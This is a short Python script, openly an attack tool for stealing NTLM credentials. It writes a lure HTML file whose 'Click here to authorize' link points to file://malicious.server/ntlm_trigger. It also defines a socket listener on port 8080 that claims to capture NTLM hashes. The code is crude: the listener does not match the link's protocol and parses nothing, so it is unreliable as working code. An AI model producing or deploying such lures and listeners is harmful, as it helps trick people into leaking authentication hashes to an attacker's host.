import socket
import os

malicious_payload = "<html><body><a href='file://malicious.server/ntlm_trigger'>Click here to authorize</a></body></html>"

def create_malicious_file(filepath):
    try:
        with open(filepath, 'w') as f:
            f.write(malicious_payload)
        print(f'[INFO] Malicious file created at: {filepath}')
    except Exception as e:
        print(f'[ERROR] Failed to create file: {e}')

def simulate_ntlm_listener(port=8080):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(5)
        print(f'[INFO] Listening for NTLM hashes on port {port}...')

        while True:
            client_socket, address = server_socket.accept()
            print(f'[INFO] Connection received from {address}')
            request = client_socket.recv(1024).decode('utf-8')
            print(f'[DEBUG] Received data: {request}')
            client_socket.close()
    except KeyboardInterrupt:
        print("[INFO] Listener stopped by user.")
    except Exception as e:
        print(f'[ERROR] Listener encountered an issue: {e}')
    finally:
        server_socket.close()

create_malicious_file('exploit.html')
# simulate_ntlm_listener()
